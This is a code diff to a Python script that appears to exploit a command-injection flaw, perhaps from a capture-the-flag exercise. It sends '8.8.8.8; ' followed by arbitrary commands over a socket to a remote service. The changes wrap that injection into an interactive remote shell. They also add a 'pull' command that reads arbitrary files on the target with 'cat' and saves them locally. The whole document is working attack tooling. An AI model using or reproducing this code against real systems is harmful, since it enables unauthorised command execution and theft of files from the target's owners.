@@ -39,8 +39,15 @@ def execute_cmd(cmd):
         s.send("8.8.8.8; " + cmd + '\n')
 
         data = s.recv(1024).split('\n')
-        print('\n'.join(data[7:]))
+        data = '\n'.join(data[7:])
+        s.close()
 
+        return data
+
+def copy(remote_filepath, local_filepath):
+        data = execute_cmd("cat " + remote_filepath)
+        with open(local_filepath, 'w') as f:
+                f.write(data)
 
 def shell():
 	directory = []
@@ -66,10 +73,10 @@ def shell():
                                         print("Invalid cd input.")
                         else:
                                 cmd = "cd /" + '/'.join(directory) + "; " + user_input
-                                execute_cmd(cmd)
+                                print(execute_cmd(cmd))
                 user_input = raw_input("/" + '/'.join(directory) + "> ").strip()
-                                
-def help():
+                
+def help_msg():
 	print("Interactive shell help menu")
 	print("Available commands:")
 	print("    shell - drop into an interactive shell. Exit with 'exit'")
@@ -85,9 +92,9 @@ def repl():
 			if data[0].lower() == "shell":
 				shell()
 			elif data[0].lower() == "pull" and len(data) == 3:
-				ftp(data[1], data[2])
+				copy(data[1], data[2])
 			else:
-				help()
+				help_msg()
 		user_input = raw_input("> ").strip()
 
 if __name__ == '__main__':
